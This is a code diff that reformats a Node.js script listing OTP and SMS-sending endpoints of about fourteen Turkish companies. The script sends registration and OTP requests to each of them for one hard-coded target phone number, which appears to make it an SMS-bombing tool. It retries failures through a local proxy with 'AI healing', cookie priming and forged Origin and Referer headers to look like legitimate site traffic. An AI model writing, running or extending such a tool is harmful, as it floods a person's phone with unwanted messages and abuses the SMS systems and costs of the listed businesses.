@@ -6,20 +6,50 @@ const TARGET_PHONE = '5343622375';
 const TEST_EMAIL = 'test-opencode-' + Date.now() + '@test.com';
 
 const ENDPOINTS = [
-  { id: 'file_market',   name: 'File Market',   url: 'https://api.filemarket.com.tr/v1/otp/send',                          payload: { mobilePhoneNumber: `90${TARGET_PHONE}` } },
-  { id: 'onur_market',   name: 'Onur Market',   url: 'https://www.onurmarket.com/api/v1/auth/register/sendOtp',            payload: { phone: TARGET_PHONE } },
-  { id: 'hayat_su',      name: 'Hayat Su',      url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp',                     payload: { mobilePhoneNumber: TARGET_PHONE, actionType: 'register' } },
-  { id: 'yapp',          name: 'Yapp',          url: 'https://yapp.com.tr/api/mobile/v1/register',                        payload: { phone_number: TARGET_PHONE, email: TEST_EMAIL, firstname: 'Test', lastname: 'Test' } },
-  { id: 'suiste',        name: 'Suiste',        url: 'https://suiste.com/api/auth/code',                                  payload: { gsm: TARGET_PHONE, action: 'register' } },
-  { id: 'e_bebek',       name: 'E-bebek',       url: 'https://www.e-bebek.com/api/v1/auth/register/send-otp',             payload: { phone: TARGET_PHONE, email: TEST_EMAIL } },
-  { id: 'bim',           name: 'BİM',           url: 'https://bim.veesk.net:443/service/v1.0/account/login',              payload: { phone: TARGET_PHONE } },
-  { id: 'bkm_express',   name: 'BKM Express',   url: 'https://www.bkmexpress.com.tr/api/v1/otp/send',                    payload: { phone: `90${TARGET_PHONE}` } },
-  { id: 'shopandfly',    name: 'Shop&Fly',      url: 'https://www.shopandfly.com.tr/api/v1/otp/send',                    payload: { phone: `90${TARGET_PHONE}` } },
-  { id: 'teb',           name: 'TEB',           url: 'https://www.teb.com.tr/api/v1/otp/send',                           payload: { phone: `90${TARGET_PHONE}` } },
-  { id: 'beefull',       name: 'Beefull',       url: 'https://app.beefull.io/api/inavitas-access-management/sms-login',   payload: { phoneCode: '90', phoneNumber: TARGET_PHONE, tenant: 'beefull' } },
-  { id: 'sportive',      name: 'Sportive',      url: 'https://www.sportive.com.tr/api/v1/auth/register/send-otp',         payload: { phone: TARGET_PHONE } },
-  { id: 'frink',         name: 'Frink',         url: 'https://api.frink.com.tr/api/auth/send-otp',                       payload: { phoneNumber: `90${TARGET_PHONE}` } },
-  { id: 'qumpara',       name: 'Qumpara',       url: 'https://tr-api.fisicek.com/v1.3/auth/getOTP',                      payload: { msisdn: `90${TARGET_PHONE}` } },
+  {
+    id: 'file_market',
+    name: 'File Market',
+    url: 'https://api.filemarket.com.tr/v1/otp/send',
+    payload: { mobilePhoneNumber: `90${TARGET_PHONE}` },
+  },
+  {
+    id: 'onur_market',
+    name: 'Onur Market',
+    url: 'https://www.onurmarket.com/api/v1/auth/register/sendOtp',
+    payload: { phone: TARGET_PHONE },
+  },
+  {
+    id: 'hayat_su',
+    name: 'Hayat Su',
+    url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp',
+    payload: { mobilePhoneNumber: TARGET_PHONE, actionType: 'register' },
+  },
+  {
+    id: 'yapp',
+    name: 'Yapp',
+    url: 'https://yapp.com.tr/api/mobile/v1/register',
+    payload: { phone_number: TARGET_PHONE, email: TEST_EMAIL, firstname: 'Test', lastname: 'Test' },
+  },
+  { id: 'suiste', name: 'Suiste', url: 'https://suiste.com/api/auth/code', payload: { gsm: TARGET_PHONE, action: 'register' } },
+  {
+    id: 'e_bebek',
+    name: 'E-bebek',
+    url: 'https://www.e-bebek.com/api/v1/auth/register/send-otp',
+    payload: { phone: TARGET_PHONE, email: TEST_EMAIL },
+  },
+  { id: 'bim', name: 'BİM', url: 'https://bim.veesk.net:443/service/v1.0/account/login', payload: { phone: TARGET_PHONE } },
+  { id: 'bkm_express', name: 'BKM Express', url: 'https://www.bkmexpress.com.tr/api/v1/otp/send', payload: { phone: `90${TARGET_PHONE}` } },
+  { id: 'shopandfly', name: 'Shop&Fly', url: 'https://www.shopandfly.com.tr/api/v1/otp/send', payload: { phone: `90${TARGET_PHONE}` } },
+  { id: 'teb', name: 'TEB', url: 'https://www.teb.com.tr/api/v1/otp/send', payload: { phone: `90${TARGET_PHONE}` } },
+  {
+    id: 'beefull',
+    name: 'Beefull',
+    url: 'https://app.beefull.io/api/inavitas-access-management/sms-login',
+    payload: { phoneCode: '90', phoneNumber: TARGET_PHONE, tenant: 'beefull' },
+  },
+  { id: 'sportive', name: 'Sportive', url: 'https://www.sportive.com.tr/api/v1/auth/register/send-otp', payload: { phone: TARGET_PHONE } },
+  { id: 'frink', name: 'Frink', url: 'https://api.frink.com.tr/api/auth/send-otp', payload: { phoneNumber: `90${TARGET_PHONE}` } },
+  { id: 'qumpara', name: 'Qumpara', url: 'https://tr-api.fisicek.com/v1.3/auth/getOTP', payload: { msisdn: `90${TARGET_PHONE}` } },
 ];
 
 const PROXY_URL = 'http://localhost:3001/api/proxy';
@@ -28,7 +58,7 @@ const MAX_STRATEGIES = 5;
 const STD_HEADERS = {
   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
   'Content-Type': 'application/json',
-  'Accept': 'application/json, text/plain, */*'
+  Accept: 'application/json, text/plain, */*',
 };
 
 async function directCall(url, method, payload, headers, timeout = 15000) {
@@ -39,21 +69,22 @@ async function directCall(url, method, payload, headers, timeout = 15000) {
       data: payload,
       timeout,
       headers: headers || STD_HEADERS,
-      validateStatus: () => true
+      validateStatus: () => true,
     });
-    const bodyStr = typeof response.data === 'object' ? JSON.stringify(response.data).substring(0, 200) : String(response.data).substring(0, 200);
+    const bodyStr =
+      typeof response.data === 'object' ? JSON.stringify(response.data).substring(0, 200) : String(response.data).substring(0, 200);
     return {
       ok: response.status >= 200 && response.status < 300,
       status: response.status,
       data: response.data,
-      body: bodyStr
+      body: bodyStr,
     };
   } catch (err) {
     return {
       ok: false,
       status: err.response?.status || 0,
       data: err.response?.data || err.message,
-      body: (err.message || '').substring(0, 200)
+      body: (err.message || '').substring(0, 200),
     };
   }
 }
@@ -83,15 +114,19 @@ async function testEndpoint(ep) {
     const start = Date.now();
     process.stdout.write(`  ├─[proxy+ai_heal] `.padEnd(32));
     try {
-      const res = await axios.post(PROXY_URL, {
-        serviceId: ep.id,
-        serviceUrl: ep.url,
-        serviceMethod: 'POST',
-        targetPhone: TARGET_PHONE,
-        email: TEST_EMAIL,
-        initialPayload: ep.payload,
-        allowAiHealing: true
-      }, { timeout: 30000, validateStatus: () => true });
+      const res = await axios.post(
+        PROXY_URL,
+        {
+          serviceId: ep.id,
+          serviceUrl: ep.url,
+          serviceMethod: 'POST',
+          targetPhone: TARGET_PHONE,
+          email: TEST_EMAIL,
+          initialPayload: ep.payload,
+          allowAiHealing: true,
+        },
+        { timeout: 30000, validateStatus: () => true },
+      );
       const elapsed = ((Date.now() - start) / 1000).toFixed(1);
       if (res.data.ok) {
         const note = res.data.healed ? ' ⚡healed' : '';
@@ -115,7 +150,9 @@ async function testEndpoint(ep) {
       const baseUrl = new URL(ep.url).origin;
       await client.get(baseUrl, { headers: STD_HEADERS, validateStatus: () => true, timeout: 8000 });
       const cookieRes = await client.post(ep.url, ep.payload, {
-        headers: STD_HEADERS, timeout: 15000, validateStatus: () => true
+        headers: STD_HEADERS,
+        timeout: 15000,
+        validateStatus: () => true,
       });
       const elapsed = ((Date.now() - start) / 1000).toFixed(1);
       if (cookieRes.status >= 200 && cookieRes.status < 300) {
@@ -135,10 +172,10 @@ async function testEndpoint(ep) {
     const forged = {
       ...STD_HEADERS,
       'Content-Type': 'application/x-www-form-urlencoded',
-      'Origin': origin,
-      'Referer': origin + '/',
+      Origin: origin,
+      Referer: origin + '/',
       'X-Requested-With': 'XMLHttpRequest',
-      'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8'
+      'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
     };
     let encoded;
     try {
